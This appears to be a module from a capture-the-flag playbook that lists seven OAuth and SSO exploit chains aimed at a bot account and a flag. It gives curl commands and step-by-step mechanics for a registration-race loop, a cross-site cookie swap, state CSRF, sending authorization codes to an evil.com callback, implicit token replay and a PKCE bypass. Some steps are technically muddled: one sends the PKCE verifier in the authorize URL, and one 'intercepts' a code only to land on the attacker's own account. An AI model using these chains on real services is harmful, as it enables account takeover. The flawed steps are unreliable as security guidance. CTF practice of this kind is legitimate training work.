# Multi-step chains — the OAuth exploit sequences that reach the sink

A single confirmed shape is rarely the exploit — it is the first link in a
chain. This module names the multi-step sequences that reach the flag.

## Chain 1 — the registration race → cookie swap → flag submit (SSOS)

```
1. Win a registration race on the fixed bot account.
2. Use a data:text/html URL and text/plain cross-site JSON login to swap
   the bot's SSO token cookie.
3. Let the buggy loginSSO authorize using the swapped cookie.
4. Read the flag from the assignment submission as the now-owned account.
```

The mechanics:

```
step 1 — the race
  the bot registers student@domain at startup; the attacker hammers
  POST /api/register for student@domain with their own password —
  before the bot's registerUser step runs.

step 2 — the swap
  the attacker submits a data:text/html URL carrying a form that POSTs
  to the IdP's /api/login with Content-Type: text/plain; the raw JSON
  lands; the Set-Cookie overwrites the shared jar's SSO token.

step 3 — the authorize
  the bot's loginSSO step ignores credentials and uses the jar's token;
  the session becomes the attacker's account.

step 4 — the read
  GET /submission/1 — the flag is on the attacker's owned account.
```

## Chain 2 — state CSRF → code interception → session

```
1. The attacker starts a flow — state_A is issued, bound to session A.
2. The victim visits the attacker's authorize URL — the IdP issues a code
   for the victim's account, delivered to the attacker's callback with
   state_A.
3. The callback accepts state_A — the session is issued on the victim's
   account.
```

The mechanics:

```
step 1 — start the flow
  curl -b $JAR -L $BASE/login → capture the authorize URL with state_A

step 2 — the victim visits
  the victim's browser issues the authorize request; the IdP 302s to
  https://app/callback?code=VICTIM_CODE&state=state_A

step 3 — the callback accepts
  the app does not verify that state_A was issued for the victim's
  session — it accepts the code and issues a session on the victim's
  account
```

## Chain 3 — loose redirect_uri → code interception → session

```
1. redirect_uri is loosely validated — a prefix, a wildcard, a different
   subdomain.
2. The attacker controls the URI the code is delivered to.
3. The code is replayable against the app's callback (state not bound).
```

The mechanics:

```
step 1 — authorize with the loose URI
  curl "https://idp/authorize?...&redirect_uri=https://evil.com/callback"

step 2 — the code is delivered
  the IdP 302s to https://evil.com/callback?code=ABC&state=XYZ —
  the code is in the attacker's hands

step 3 — replay against the app's callback
  curl -b $JAR "https://app/callback?code=ABC&state=XYZ" —
  the session is issued on the attacker's account
```

## Chain 4 — implicit leak → token replay → session

```
1. response_type is not allowlisted — token or id_token is accepted.
2. The token is in the fragment — leaked via Referer or DOM access.
3. The token is replayable — bound to the app but not to the request.
```

The mechanics:

```
step 1 — coerce to implicit
  curl "https://idp/authorize?...&response_type=token&state=XYZ"

step 2 — the token is in the fragment
  the 302 carries #access_token=ABC — the callback page loads a
  subresource; the Referer carries the fragment

step 3 — replay the token
  curl "https://app/callback?access_token=ABC" — the session is issued
```

## Chain 5 — PKCE bypass → stolen code → session

```
1. code_challenge_method accepts plain — the verifier is in the URL.
2. The verifier is captured from the URL or the browser history.
3. The code is exchangeable with the captured verifier.
```

The mechanics:

```
step 1 — authorize with plain
  curl "https://idp/authorize?...&code_challenge_method=plain&
        code_challenge=ABC&code_verifier=ABC"

step 2 — capture the verifier
  the verifier is in the URL — captured from the browser history

step 3 — exchange the code
  curl -X POST $IDP/token -d "grant_type=authorization_code&code=STOLEN&
      client_id=APP&code_verifier=ABC" — the token is issued
```

## Chain 6 — account linking on email → pre-registration → session

```
1. The bot registers a fixed account at startup — student@domain.
2. The attacker pre-registers student@domain with their own password.
3. The bot's OAuth login lands on the attacker's account (the email
   matches); the flag is submitted into the attacker's owned account.
```

The mechanics:

```
step 1 — the pre-registration race
  for i in $(seq 1 50); do curl -X POST $BASE/api/register -d
      '{"email":"student@domain","password":"own"}' & done

step 2 — the bot's registration fails
  the account is already registered with the attacker's password

step 3 — the OAuth login lands on the attacker's account
  the linking is on email — the session is issued on the attacker's
  pre-registered account

step 4 — the flag is submitted
  the bot's submitAssignment step writes the flag to /submission/1
```

## Chain 7 — cookie swap → loginSSO → session

```
1. The SSO token cookie has SameSite missing or None — cross-site
   writes land.
2. A text/plain JSON login overwrites the shared jar's token.
3. The buggy loginSSO authorizes using the swapped cookie.
```

The mechanics:

```
step 1 — the cross-site write
  a data:text/html URL carries a form that POSTs to the IdP's
  /api/login with Content-Type: text/plain — the raw JSON lands

step 2 — the Set-Cookie overwrites
  the IdP responds 200 + Set-Cookie: token=NEW — the shared jar's
  token is overwritten

step 3 — the loginSSO step
  the app's loginSSO reads the jar's token — the swapped one — and
  issues a session on the attacker's account
```

## The chain map

| Entry shape | The chain | The sink |
|---|---|---|
| state not bound | code interception → session | the victim's account |
| redirect_uri loose | code interception → session | the attacker's account |
| SameSite missing | cookie swap → loginSSO → session | the attacker's account |
| account linking on email | pre-registration → OAuth login → session | the flag submission |
| response_type not allowlisted | implicit leak → token replay | the victim's account |
| PKCE plain | stolen code → exchange | the attacker's account |
| code not bound to client_id | cross-client → replay | the attacker's account |
| registration race | pre-registration → OAuth login | the flag submission |
